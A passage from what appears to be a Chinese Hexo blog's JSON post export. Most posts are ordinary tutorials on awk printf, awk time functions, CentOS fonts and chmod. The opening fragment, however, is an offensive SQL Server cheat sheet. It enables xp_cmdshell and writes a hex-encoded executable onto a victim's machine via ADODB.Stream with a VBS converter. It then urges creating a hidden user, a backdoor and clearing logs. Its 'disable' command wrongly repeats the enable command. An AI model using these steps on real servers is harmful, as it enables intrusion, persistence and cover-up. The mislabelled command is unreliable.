/>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />&#x3D;&#x3D;参数说明:目录名,目录深度,是否显示文件&#x3D;&#x3D;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />execute master..xp_dirtree ‘c:’<br />execute master..xp_dirtree ‘c:’,1<br />execute master..xp_dirtree ‘c:’,1,1<br />——————————————————————————————————–<br />sql2005<br />恢复xp_cmdshell<br />EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;<br />关闭:<br />EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;<br />————————————————————————————————————-<br />把要转的文件拖到脚本上去, 就会生成包含HEX代码的文本.<br />然后用以下方法写入到对方计算机中。DECLARE @ObjectToken INT<br />EXEC sp_OACreate ‘ADODB.Stream’, @ObjectToken OUTPUT<br />EXEC sp_OASetProperty @ObjectToken, ‘Type’, 1<br />EXEC sp_OAMethod @ObjectToken, ‘Open’<br />EXEC sp_OAMethod @ObjectToken, ‘Write’, NULL, 0x123456(其中0x123456为HEX内容)<br />EXEC sp_OAMethod @ObjectToken, ‘SaveToFile’, NULL, ‘Test.exe(文件名)’, 2<br />EXEC sp_OAMethod @ObjectToken, ‘Close’<br />EXEC sp_OADestroy @ObjectToken<br />复制代码写入之后, 就发挥你的办法去执行你写入的这个文件就OK了<br />FILE2HEX.VBS<br />On Error Resume Next<br />FilePath &#x3D; Wscript.Arguments(0)<br />FieName &#x3D; Right(FilePath, Len(FilePath) - InStrRev(FilePath, &quot;&quot;))<br />With CreateObject(&quot;Adodb.Stream&quot;)<br />.Type &#x3D; 1: .open: .loadfromfile FilePath: Str &#x3D; .read: Sl &#x3D; LenB(Str)<br />End With<br /><br />Sll &#x3D; Sl Mod 65536: Slh &#x3D; Sl  65536<br />With CreateObject(&quot;Scripting.FileSystemObject&quot;).OpenTextFile(FilePath &amp; &quot;.txt&quot;, 2, True)<br />.Write &quot;0x&quot;<br />For i &#x3D; 1 To Sl<br />bt &#x3D; AscB(MidB(Str, i, 1))<br />If bt &lt; 16 Then .Write &quot;0&quot;<br />.Write Hex(bt)<br />Next<br />End With<br /><br />进去服务器后，创建隐藏用户。防止后门，清理日志，走人。。<br />嘿嘿，最后嘱咐一下，缺德的时候别多做。。看看就行，，</p>\n"},{"title":"awk printf函数","date":"2012-03-20T02:10:00.000Z","_content":"<p>awkprintf感觉很好用，print好用多了。</p><p>和c的printf用法一样。</p><p>awk -F# '{printf(&quot;insert into info values(&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;);n&quot;, $1, $2, $3)}' sqlfile.sql</p><p>&nbsp;</p><p>度娘，你的编辑器啥时候好用啊。</p>","source":"_posts/awk-printf函数.md","raw":"title: awk printf函数\ncategories: [Shell编程]\ntags: []\ndate: 2012-03-20 10:10:00\n---\n<p>awkprintf感觉很好用，print好用多了。</p><p>和c的printf用法一样。</p><p>awk -F# '{printf(&quot;insert into info values(&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;);n&quot;, $1, $2, $3)}' sqlfile.sql</p><p>&nbsp;</p><p>度娘，你的编辑器啥时候好用啊。</p>","slug":"awk-printf函数","published":1,"updated":"2023-04-22T05:38:44.730Z","_id":"clgrjlxb6000e7opi74190z82","comments":1,"layout":"post","photos":[],"link":"","content":"<p>awkprintf感觉很好用，print好用多了。</p><p>和c的printf用法一样。</p><p>awk -F# '{printf(&quot;insert into info values(&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;);n&quot;, $1, $2, $3)}' sqlfile.sql</p><p>&nbsp;</p><p>度娘，你的编辑器啥时候好用啊。</p>","site":{"data":{}},"excerpt":"","more":"<p>awkprintf感觉很好用，print好用多了。</p><p>和c的printf用法一样。</p><p>awk -F# '{printf(&quot;insert into info values(&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;);n&quot;, $1, $2, $3)}' sqlfile.sql</p><p>&nbsp;</p><p>度娘，你的编辑器啥时候好用啊。</p>"},{"title":"centos 5.5添加新的字符集","date":"2011-11-28T09:57:00.000Z","_content":"<p>1.下载相应的字符集。</p><p>2.在服务器上，进入/usr/share/fonts/目录下&nbsp; </p><p>新建一个目录，随便了。myfont</p><p>3。复制字符集到myfont目录。</p><p>进入myfont</p><p>运行下边的命令更新字符集。<br />mkfontscale<br />mkfontdir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />fc-cache</p><p>cat fonts.dir 看看支持的字符。</p><p>4.如果要修改系统的话，就LANG=‘字符集’</p><p>&nbsp;</p>","source":"_posts/centos-5.5添加新的字符集.md","raw":"title: centos 5.5添加新的字符集\ncategories: [Linux]\ntags: []\ndate: 2011-11-28 17:57:00\n---\n<p>1.下载相应的字符集。</p><p>2.在服务器上，进入/usr/share/fonts/目录下&nbsp; </p><p>新建一个目录，随便了。myfont</p><p>3。复制字符集到myfont目录。</p><p>进入myfont</p><p>运行下边的命令更新字符集。<br />mkfontscale<br />mkfontdir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />fc-cache</p><p>cat fonts.dir 看看支持的字符。</p><p>4.如果要修改系统的话，就LANG=‘字符集’</p><p>&nbsp;</p>","slug":"centos-5.5添加新的字符集","published":1,"updated":"2023-04-22T05:38:44.734Z","_id":"clgrjlxb7000f7opieprv7s9f","comments":1,"layout":"post","photos":[],"link":"","content":"<p>1.下载相应的字符集。</p><p>2.在服务器上，进入/usr/share/fonts/目录下&nbsp; </p><p>新建一个目录，随便了。myfont</p><p>3。复制字符集到myfont目录。</p><p>进入myfont</p><p>运行下边的命令更新字符集。<br />mkfontscale<br />mkfontdir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />fc-cache</p><p>cat fonts.dir 看看支持的字符。</p><p>4.如果要修改系统的话，就LANG=‘字符集’</p><p>&nbsp;</p>","site":{"data":{}},"excerpt":"","more":"<p>1.下载相应的字符集。</p><p>2.在服务器上，进入/usr/share/fonts/目录下&nbsp; </p><p>新建一个目录，随便了。myfont</p><p>3。复制字符集到myfont目录。</p><p>进入myfont</p><p>运行下边的命令更新字符集。<br />mkfontscale<br />mkfontdir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />fc-cache</p><p>cat fonts.dir 看看支持的字符。</p><p>4.如果要修改系统的话，就LANG=‘字符集’</p><p>&nbsp;</p>"},{"title":"awk中的时间函数strftime() systime()","date":"2011-12-15T01:40:00.000Z","_content":"<p>systime函数返回从1970年1月1日开始到当前时间(不计闰年)的整秒数</p><p>利用strftime()函数格式化时间</p><ul><li><p>实例：</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now = systime(); print now }'</li><li><p>strftime函数使用C库中的strftime函数格式化时间。格式如下：</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; systime( [format specification][,timestamp] )<p><strong>Table 3. 日期和时间格式说明符</strong></p><col></col><col>格式描述%a星期几的缩写(Sun)%A星期几的完整写法(Sunday)%b月名的缩写(Oct)%B月名的完整写法(October)%c本地日期和时间%d十进制日期%D日期 08/20/99%e日期，如果只有一位会补上一个空格%H用十进制表示24小时格式的小时%I用十进制表示12小时格式的小时%j从1月1日起一年中的第几天%m十进制表示的月份%M十进制表示的分钟%p12小时表示法(AM/PM)%S十进制表示的秒%U十进制表示的一年中的第几个星期(星期天作为一个星期的开始)%w十进制表示的星期几(星期天是0)%W十进制表示的一年中的第几个星期(星期一作为一个星期的开始)%x重新设置本地日期(08/20/99)%X重新设置本地时间(12：00：00)%y两位数字表示的年(99)%Y当前月份%Z时区(PDT)%%百分号(%)</col><p>实例:</p></li><li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now=strftime( &quot;%D&quot;, systime() ); print now }' <br /></li><li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now=strftime(&quot;%m/%d/%y&quot;); print now }'</li><li></li><li></li></ul>","source":"_posts/awk中的时间函数strftime()-systime().md","raw":"title: awk中的时间函数strftime() systime()\ncategories: [Shell编程]\ntags: []\ndate: 2011-12-15 09:40:00\n---\n<p>systime函数返回从1970年1月1日开始到当前时间(不计闰年)的整秒数</p><p>利用strftime()函数格式化时间</p><ul><li><p>实例：</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now = systime(); print now }'</li><li><p>strftime函数使用C库中的strftime函数格式化时间。格式如下：</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; systime( [format specification][,timestamp] )<p><strong>Table 3. 日期和时间格式说明符</strong></p><col></col><col>格式描述%a星期几的缩写(Sun)%A星期几的完整写法(Sunday)%b月名的缩写(Oct)%B月名的完整写法(October)%c本地日期和时间%d十进制日期%D日期 08/20/99%e日期，如果只有一位会补上一个空格%H用十进制表示24小时格式的小时%I用十进制表示12小时格式的小时%j从1月1日起一年中的第几天%m十进制表示的月份%M十进制表示的分钟%p12小时表示法(AM/PM)%S十进制表示的秒%U十进制表示的一年中的第几个星期(星期天作为一个星期的开始)%w十进制表示的星期几(星期天是0)%W十进制表示的一年中的第几个星期(星期一作为一个星期的开始)%x重新设置本地日期(08/20/99)%X重新设置本地时间(12：00：00)%y两位数字表示的年(99)%Y当前月份%Z时区(PDT)%%百分号(%)</col><p>实例:</p></li><li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now=strftime( &quot;%D&quot;, systime() ); print now }' <br /></li><li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now=strftime(&quot;%m/%d/%y&quot;); print now }'</li><li></li><li></li></ul>","slug":"awk中的时间函数strftime()-systime()","published":1,"updated":"2023-04-22T05:38:44.733Z","_id":"clgrjlxb8000h7opi1ubo1du7","comments":1,"layout":"post","photos":[],"link":"","content":"<p>systime函数返回从1970年1月1日开始到当前时间(不计闰年)的整秒数</p><p>利用strftime()函数格式化时间</p><ul><li><p>实例：</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now = systime(); print now }'</li><li><p>strftime函数使用C库中的strftime函数格式化时间。格式如下：</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; systime( [format specification][,timestamp] )<p><strong>Table 3. 日期和时间格式说明符</strong></p><col></col><col>格式描述%a星期几的缩写(Sun)%A星期几的完整写法(Sunday)%b月名的缩写(Oct)%B月名的完整写法(October)%c本地日期和时间%d十进制日期%D日期 08/20/99%e日期，如果只有一位会补上一个空格%H用十进制表示24小时格式的小时%I用十进制表示12小时格式的小时%j从1月1日起一年中的第几天%m十进制表示的月份%M十进制表示的分钟%p12小时表示法(AM/PM)%S十进制表示的秒%U十进制表示的一年中的第几个星期(星期天作为一个星期的开始)%w十进制表示的星期几(星期天是0)%W十进制表示的一年中的第几个星期(星期一作为一个星期的开始)%x重新设置本地日期(08/20/99)%X重新设置本地时间(12：00：00)%y两位数字表示的年(99)%Y当前月份%Z时区(PDT)%%百分号(%)</col><p>实例:</p></li><li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now=strftime( &quot;%D&quot;, systime() ); print now }' <br /></li><li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now=strftime(&quot;%m/%d/%y&quot;); print now }'</li><li></li><li></li></ul>","site":{"data":{}},"excerpt":"","more":"<p>systime函数返回从1970年1月1日开始到当前时间(不计闰年)的整秒数</p><p>利用strftime()函数格式化时间</p><ul><li><p>实例：</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now = systime(); print now }'</li><li><p>strftime函数使用C库中的strftime函数格式化时间。格式如下：</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; systime( [format specification][,timestamp] )<p><strong>Table 3. 日期和时间格式说明符</strong></p><col></col><col>格式描述%a星期几的缩写(Sun)%A星期几的完整写法(Sunday)%b月名的缩写(Oct)%B月名的完整写法(October)%c本地日期和时间%d十进制日期%D日期 08/20/99%e日期，如果只有一位会补上一个空格%H用十进制表示24小时格式的小时%I用十进制表示12小时格式的小时%j从1月1日起一年中的第几天%m十进制表示的月份%M十进制表示的分钟%p12小时表示法(AM/PM)%S十进制表示的秒%U十进制表示的一年中的第几个星期(星期天作为一个星期的开始)%w十进制表示的星期几(星期天是0)%W十进制表示的一年中的第几个星期(星期一作为一个星期的开始)%x重新设置本地日期(08/20/99)%X重新设置本地时间(12：00：00)%y两位数字表示的年(99)%Y当前月份%Z时区(PDT)%%百分号(%)</col><p>实例:</p></li><li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now=strftime( &quot;%D&quot;, systime() ); print now }' <br /></li><li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ awk '{ now=strftime(&quot;%m/%d/%y&quot;); print now }'</li><li></li><li></li></ul>"},{"title":"chmod详解","date":"2010-05-22T02:12:00.000Z","_content":"<br />chmod命令是非常重要的，用于改变文件或目录的访问权限。用户用它控制文件或目录的访问权限。<br />该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。<br />1. 文字设定法<br />chmod [who] [+ | - | =] [mode] 文件名? <br />命令中各选项的含义为：<br />操作对象who可是下述字母中的任一个或者它们的组合：<br /><br />u 表示“用户（user）”，即文件或目录的所有者。<br />g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户。<br />o 表示“其他（others）用户”。<br />a 表示“所有（all）用户”。它是系统默认值。<br />操作符号可以是：<br />+ 添加某个权限。<br />- 取消某个权限。<br />= 赋予给定权限并取消其他所有权限（如果有的话）。<br />设置mode所表示的权限可用下述字母的任意组合：<br />r 可读。<br />w 可写。<br />x 可执行。<br />X 只有目标文件对某些用户是可执行的或该目标文件是目录时才追加x 属性。<br />s 在文件执行时把进程的属主或组ID置为该文件的文件属主。方式“u＋s”设置文件的用户ID位，“g＋s”设置组ID位。<br />（为了方便普通用户执行一些特权命令，SUID/SGID程序允许普通用户以root身份暂时执行该程序，并在执行结束后再恢复身份<br />chmod +s 就是给某个程序或者教本以suid权限 ）<br />t 保存程序的文本到交换设备上。<br />u 与文件属主拥有一样的权限。<br />g 与和文件属主同组的用户拥有一样的权限。<br />o 与其他用户拥有一样的权限。<br />文件名：以空格分开的要改变权限的文件列表，支持通配符。<br />在一个命令行中可给出多个权限方式，其间用逗号隔开。例如：chmod g+r，o+r example<br />使同组和其他用户对文件example 有读权限。<br />2. 数字设定法<br />我们必须首先了解用数字表示的属性的含义：0表示没有权限，1表示可执行权限，2表示可写权限，4表示可读权限，然后将其相加。所以数字属性的格式应为3个从0到7的八进制数，其顺序是（u）（g）（o）。<br />例如，如果想让某个文件的属主有“读/写”二种权限，需要把4（可读）+2（可写）＝6（读/写）。<br />数字设定法的一般形式为：<br />chmod [mode] 文件名? <br />例子：<br />（1）文字设定法：<br />例1：$ chmod a+x sort<br />即设定文件sort的属性为：<br />文件属主（u） 增加执行权限<br />与文件属主同组用户（g） 增加执行权限<br />其他用户（o） 增加执行权限　<br />例2：$ chmod ug+w，o-x text<br />即设定文件text的属性为：<br />文件属主（u） 增加写权限<br />与文件属主同组用户（g） 增加写权限<br />其他用户（o） 删除执行权限<br />例3：$ chmod u+s a.out<br />假设执行chmod后a.out的权限为（可以用ls – l a.out命令来看）：<br />–rws--x--x 1 inin users 7192 Nov 4 14:22 a.out<br />并且这个执行文件要用到一个文本文件shiyan1.c，其文件存取权限为“–rw-------”，即该文件只有其属主具有读写权限。<br />当其他用户执行a.out这个程序时，他的身份因这个程序暂时变成inin（由于chmod命令中使用了s选项），所以他就能够读取shiyan1.c这个文件（虽然这个文件被设定为其他人不具备任何权限），这就是s的功能。<br />因此，在整个系统中特别是root本身，最好不要过多的设置这种类型的文件（除非必要）这样可以保障系统的安全，避免因为某些程序的bug而使系统遭到入侵。<br />例4：$ chmod a–x mm.txt<br />$ chmod –x mm.txt<br />$ chmod ugo–x mm.txt<br />以上这三个命令都是将文件mm.txt的执行权限删除，它设定的对象为所有使用者。<br />（2）数字设定法：<br />例1： $ chmod 644 mm.txt<br />$ ls –l<br />即设定文件mm.txt的属性为：<br />-rw-r--r-- 1 inin users 1155 Nov 5 11:22 mm.txt<br />文件属主（u）inin 拥有读、写权限<br />与文件属主同组人用户（g） 拥有读权限<br />其他人（o） 拥有读权限<br />例2： $ chmod 750 wch.txt<br />$ ls –l<br />-rwxr-x--- 1 inin users 44137 Nov 12 9:22 wchtxt<br />即设定wchtxt这个文件的属性为：<br />文件主本人（u）inin 可读/可写/可执行权<br />与文件主同组人（g） 可读/可执行权<br />其他人（o） 没有任何权限","source":"_posts/chmod详解.md","raw":"title: chmod详解\ncategories: [Linux]\ntags: []\ndate: 2010-05-22 10:12:00\n---\n<br />chmod命令是非常重要的，用于改变文件或目录的访问权限。用户用它控制文件或目录的访问权限。<br />该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。<br />1. 文字设定法<br />chmod [who] [+ | - | =] [mode] 文件名? <br />命令中各选项的含义为：<br />操作对象who可是下述字母中的任一个或者它们的组合：<br /><br />u 表示“用户（user）”，即文件或目录的所有者。<br />g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户。<br />o 表示“其他（others）用户”。<br />a 表示“所有（all）用户”。它是系统默认值。<br />操作符号可以是：<br />+ 添加某个权限。<br />- 取消某个权限。<br />= 赋予给定权限并取消其他所有权限（如果有的话）。<br />设置mode所表示的权限可用下述字母的任意组合：<br />r 可读。<br />w 可写。<br />x 可执行。<br />X 只有目标文件对某些用户是可执行的或该目标文件是目录时才追加x 属性。<br />s 在文件执行时把进程的属主或组ID置为该文件的文件属主。方式“u＋s”设置文件的用户ID位，“g＋s”设置组ID位。<br />（为了方便普通用户执行一些特权命令，SUID/SGID程序允许普通用户以root身份暂时执行该程序，并在执行结束后再恢复身份<br />chmod +s 就是给某个程序或者教本以suid权限 ）<br />t 保存程序的文本到交换设备上。<br />u 与文件属主拥有一样的权限。<br />g 与和文件属主同组的用户拥有一样的权限。<br />o 与其他用户拥有一样的权限。<br />文件名：以空格分开的要改变权限的文件列表，支持通配符。<br />在一个命令行中可给出多个权限方式，其间用逗号隔开。例如：chmod g+r，o+r example<br />使同组和其他用户对文件example 有读权限。<br />2. 数字设定法<br />我们必须首先了解用数字表示的属性的含义：0表示没有权限，1表示可执行权限，2表示可写权限，4表示可读权限，然后将其相加。所以数字属性的格式应为3个从0到7的八进制数，其顺序是（u）（g）（o）。<br />例如，如果想让某个文件的属主有“读/写”二种权限，需要把4（可读）+2（可写）＝6（读/写）。<br />数字设定法的一般形式为：<br />chmod [mode] 文件名? <br />例子：<br />（1）文字设定法：<br />例1：$ chmod a+x sort<br />即设定文件sort的属性为：<br />文件属主（u） 增加执行权限<br />与文件属主同组用户（g） 增加执行权限<br />其他用户（o） 增加执行权限　<br />例2：$ chmod ug+w，o-x text<br />即设定文件text的属性为：<br />文件属主（u） 增加写权限<br />与文件属主同组用户（g） 增加写权限<br />其他用户（o） 删除执行权限<br />例3：$ chmod u+s a.out<br />假设执行chmod后a.out的权限为（可以用ls – l a.out命令来看）：<br />–rws--x--x 1 inin users 7192 Nov 4 14:22 a.out<br />并且这个执行文件要用到一个文本文件shiyan1.c，其文件存取权限为“–rw-------”，即该文件只有其属主具有读写权限。<br />当其他用户执行a.out这个程序时，他的身份因这个程序暂时变成inin（由于chmod命令中使用了s选项），所以他就能够读取shiyan1.c这个文件（虽然这个文件被设定为其他人不具备任何权限），这就是s的功能。<br />因此，在整个系统中特别是root本身，最好不要过多的设置这种类型的文件（除非必要）这样可以保障系统的安全，避免因为某些程序的bug而使系统遭到入侵。<br />例4：$ chmod a–x mm.txt<br />$ chmod –x mm.txt<br />$ chmod ugo–x mm.txt<br />以上这三个命令都是将文件mm.txt的执行权限删除，它设定的对象为所有使用者。<br />（2）数字设定法：<br />例1： $ chmod 644 mm.txt<br />$ ls –l<br />即设定文件mm.txt的属性为：<br />-rw-r--r-- 1 inin users 1155 Nov 5 11:22 mm.txt<br />文件属主（u）inin 拥有读、写权限<br />与文件属主同组人用户（g） 拥有读权限<br />其他人（o） 拥有读权限<br />例2： $ chmod 750 wch.txt<br />$ ls –l<br />-rwxr-x--- 1 inin users 44137 Nov 12 9:22 wchtxt<br />即设定wchtxt这个文件的属性为：<br />文件主本人（u）inin 可读/可写/可执行权<br />与文件主同组人（g） 可读/可执行权<br />其他人（o） 没有任何权限","slug":"chmod详解","published":1,"updated":"2023-04-22T05:38:44.737Z","_id":"clgrjlxb9000j7opig4vjhj6l","comments":1,"layout":"post","photos":[],"link":"","content":"<p><br />chmod命令是非常重要的，用于改变文件或目录的访问权限。用户用它控制文件或目录的访问权限。<br />该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。<br />1. 文字设定法<br />chmod [who] [+ | - | &#x3D;] [mode] 文件名? <br />命令中各选项的含义为：<br />操作对象who可是下述字母中的任一个或者它们的组合：<br /><br />u 表示“用户（user）”，即文件或目录的所有者。<br />g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户。<br />o 表示“其他（others）用户”。<br />a 表示“所有（all）用户”。它是系统默认值。<br />操作符号可以是：<br />+ 添加某个权限。<br />- 取消某个权限。<br />&#x3D; 赋予给定权限并取消其他所有权限（如果有的话）。<br />设置mode所表示的权限可用下述字母的任意组合：<br />r 可读。<br />w 可写。<br />x 可执行。<br />X 只有目标文件对某些用户是可执行的或该目标文件是目录时才追加x 属性。<br />s 在文件执行时把进程的属主或组ID置为该文件的文件属主。方式“u＋s”设置文件的用户ID位，“g＋s”设置组ID位。<br />（为了方便普通用户执行一些特权命令，SUID&#x2F;SGID程序允许普通用户以root身份暂时执行该程序，并在执行结束后再恢复身份<br />chmod +s 就是给某个程序或者教本以suid权限 ）<br />t 保存程序的文本到交换设备上。<br />u 与文件属主拥有一样的权限。<br />g 与和文件属主同组的用户拥有一样的权限。<br />o 与其他用户拥有一样的权限。<br />文件名：以空格分开的要改变权限的文件列表，支持通配符。<br />在一个命令行中可给出多个权限方式，其间用逗号隔开。例如：chmod g+r，o+r example<br />使同组和其他用户对文件example 有读权限。<br />2. 数字设定法<br />我们必须首先了解用数字表示的属性的含义：0表示没有权限，1表示可执行权限，2表示可写权限，4表示可读权限，然后将其相加。所以数字属性的格式应为3个从0到7的八进制数，其顺序是（u）（g）（o）。<br />例如，如果想让某个文件的属主有“读&#x2F;写”二种权限，需要把4（可读）+2（可写）＝6（读&#x2F;写）。<br />数字设定法的一般形式为：<br />chmod [mode] 文件名? <br />例子：<br />（1）文字设定法：<br />例1：$ chmod a+x sort<br />即设定文件sort的属性为：<br />文件属主（u） 增加执行权限<br />与文件属主同组用户（g） 增加执行权限<br />其他用户（o） 增加执行权限　<br />例2：$ chmod ug+w，o-x text<br />即设定文件text的属性为：<br />文件属主（u） 增加写权限<br />与文件属主同组用户（g） 增加写权限<br />其他用户（o） 删除执行权限<br />例3：$ chmod u+s a.out<br />假设执行chmod后a.out的权限为（可以用ls – l a.out命令来看）：<br />–rws–x–x 1 inin users 7192 Nov 4 14:22 a.out<br />并且这个执行文件要用到一个文本文件shiyan1.c，其文件存取权限为“–rw——-”，即该文件只有其属主具有读写权限。<br />当其他用户执行a.out这个程序时，他的身份因这个程序暂时变成inin（由于chmod命令中使用了s选项），所以他就能够读取shiyan1.c这个文件（虽然这个文件被设定为其他人不具备任何权限），这就是s的功能。<br />因此，在整个系统中特别是root本身，最好不要过多的设置这种类型的文件（除非必要）这样可以保障系统的安全，避免因为某些程序的bug而使系统遭到入侵。<br />例4：$ chmod a–x mm.txt<br />$ chmod –x mm.txt<br />$ chmod ugo–x mm.txt<br />以上这三个命令都是将文件mm.txt的执行权限删除，它设定的对象为所有使用者。<br />（2）数字设定法：<br />例1： $ chmod 644 mm.txt<br />$ ls –l<br />即设定文件mm.txt的属性为：<br />-rw-r–r– 1 inin users 1155 Nov 5 11:22 mm.txt<br />文件属主（u）inin 拥有读、写权限<br />与文件属主同组人用户（g） 拥有读权限<br />其他人（o） 拥有读权限<br />例2： $ chmod 750 wch.txt<br />$ ls –l<br />-rwxr-x— 1 inin users 44137 Nov 12 9:22 wchtxt<br />即设定wchtxt这个文件的属性为：<br />文件主本人（u）inin 可读&#x2F;可写&#x2F;可执行权<br />与文件主同组人（g） 可读&#x2F;可执行权<br />其他人（o） 没有任何权限</p>\n","site":{"data":{}},"excerpt":"","more":"<p><br />chmod命令是非常重要的，用于改变文件或目录的访问权限。用户用它控制文件或目录的访问权限。<br />该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。<br />1. 文字设定法<br />chmod [who] [+ | - | &#x3D;] [mode] 文件名? <br />命令中各选项的含义为：<br />操作对象who可是下述字母中的任一个或者它们的组合：<br /><br />u 表示“用户（user）”，即文件或目录的所有者。<br />g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户。<br />o 表示“其他（others）用户”。<br />a 表示“所有（all）用户”。它是系统默认值。<br />操作符号可以是：<br />+ 添加某个权限。<br />- 取消某个权限。<br />&#x3D; 赋予给定权限并取消其他所有权限（如果有的话）。<br />设置mode所表示的权限可用下述字母的任意组合：<br />r 可读。<br />w 可写。<br />x 可执行。<br />X 只有目标文件对某些用户是可执行的或该目标文件是目录时才追加x 属性。<br />s 在文件执行时把进程的属主或组ID置为该文件的文件属主。方式“u＋s”设置文件的用户ID位，“g＋s”设置组ID位。<br />（为了方便普通用户执行一些特权命令，SUID&#x2F;SGID程序允许普通用户以root身份暂时执行该程序，并在执行结束后再恢复身份<br />chmod +s 就是给某个程序或者教本以suid权限 ）<br />t 保存程序的文本到交换设备上。<br />u 与文件属主拥有一样的权限。<br />g 与和文件属主同组的用户拥有一样的权限。<br />o 与其他用户拥有一样的权限。<br />文件名：以空格分开的要改变权限的文件列表，支持通配符。<br />在一个命令行中可给出多个权限方式，其间用逗号隔开。例如：chmod g+r，o+r example<br />使同组和其他用户对文件example 有读权限。<br />2. 数字设定法<br />我们必须首先了解用数字表示的属性的含义：0表示没有权限，1表示可执行权限，2表示可写权限，4表示可读权限，然后将其相加。所以数字属性的格式应为3个从0到7的八进制数，其顺序是（u）（g）（o）。<br />例如，如果想让某个文件的属主有“读&#x2F;写”二种权限，需要把4（可读）+2（可写）＝6（读&#x2F;写）。<br />数字设定法的一般形式为：<br />chmod [mode] 文件名? <br />例子：<br />（1）文字设定法：<br />例1：$ chmod a+x sort<br />即设定文件sort的属性为：<br />文件属主（u） 增加执行权限<br />与文件属主同组用户（g） 增加执行权限<br />其他用户（o） 增加执行权限　<br />例2：$ chmod ug+w，o-x text<br />即设定文件text的属性为：<br />文件属主（u） 增加写权限<br />与文件属主同组用户（g） 增加写权限<br />其他用户（o） 删除执行权限<br />例3：$ chmod u+s a.out<br />假设执行chmod后a.out的权限为（可以用ls – l a.out命令来看）：<br />–rws–x–x 1 inin users 7192 Nov 4 14:22 a.out<br />并且这个执行文件要用到一个文本文件shiyan1.c，其文件存取权限为“–rw——-”，即该文件只有其属主具有读写权限。<br />当其他用户执行a.out这个程序时，他的身份因这个程序暂时变成inin（由于chmod命令中使用了s选项），所以他就能够读取shiyan1.c这个文件（虽然这个文件被设定为其他人不具备任何权限），这就是s的功能。<br />因此，在整个系统中特别是root本身，最好不要过多的设置这种类型的文件（除非必要）这样可以保障系统的安全，避免因为某些程序的bug而使系统遭到入侵。<br />例4：$ chmod a–x mm.txt<br />$ chmod –x mm.txt<br />$ chmod ugo–x mm.txt<br />以上这三个命令都是将文件mm.txt的执行权限删除，它设定的对象为所有使用者。<br />（2）数字设定法：<br />例1： $ chmod 